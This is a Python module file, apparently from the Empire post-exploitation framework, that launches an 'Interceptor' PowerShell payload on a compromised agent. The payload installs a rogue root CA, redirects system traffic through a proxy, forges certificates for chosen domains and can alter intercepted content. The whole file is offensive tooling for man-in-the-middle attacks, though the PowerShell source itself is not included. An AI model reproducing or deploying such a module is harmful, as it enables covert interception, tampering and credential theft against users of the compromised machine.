from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Interceptor',

            'Author': ['Tristan Dostaler', 'Casey Smith'],

            'Description': ('Add a root CA and enable system wide HTTP(s) proxy'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'At the moment, this modules works only with IE and cuts the agent connection (so not working)'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ListenPort' : {
                'Description'   :   'Configurable Port to listen for incoming Web requests. The Default is 8081',
                'Required'      :   False,
                'Value'         :   '8081'
            },
            'ProxyServer' : {
                'Description'   :   'In many environments it will be necessary to chain HTTP(s) requests upstream to another proxy server. Default behavior expects no upstream proxy.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ProxyPort' : {
                'Description'   :   'In many environments it will be necessary to chain HTTP(s) requests upstream to another proxy server. This sets the Port for the upstream proxy',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Tamper' : {
                'Description'   :   'Sometimes replaces "Cyber" with "Kitten". Used with SearchString and ReplaceString',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'HostCA' : {
                'Description'   :   'This allows remote devices to connect and install the Interceptor Root Certificate Authority From the remote/mobile device browse to http://[InterceptorIP]:8082/i.cer example: http://192.168.1.1:8082/i.cer',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'AutoProxyConfig' : {
                'Description'   :   'This will alter the proxy settings to drive traffic through Interceptor.',
                'Required'      :   False,
                'Value'         :   'True'
            },
            'Cleanup' : {
                'Description'   :   'Removes any installed certificates and exits.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'SearchString' : {
                'Description'   :   'If Tamper is enabled, this will search for a string to be replace. To be used with "ReplaceString" parameter',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ReplaceString' : {
                'Description'   :   'If Tamper is enabled, this will be the string that replaces the string identified by the "SearchString" parameter',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Domains' : {
                'Description'   :   'Accepts a list of domains to create Trusted root Certs for at the beginning of script run. List should be delimited with a comma "," .',
                'Required'      :   False,
                'Value'         :   ''
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        moduleName = self.info["Name"]
        
        # read in the common powerview.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-Interceptor.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # get just the code needed for the specified function
        script = moduleCode

        script += "\nSet-Interceptor "
        # add any arguments to the end execution of the script
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    elif values['Value'].lower() != "false":
                        script += " -" + str(option) + " " + str(values['Value'])
        script += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'

        return script
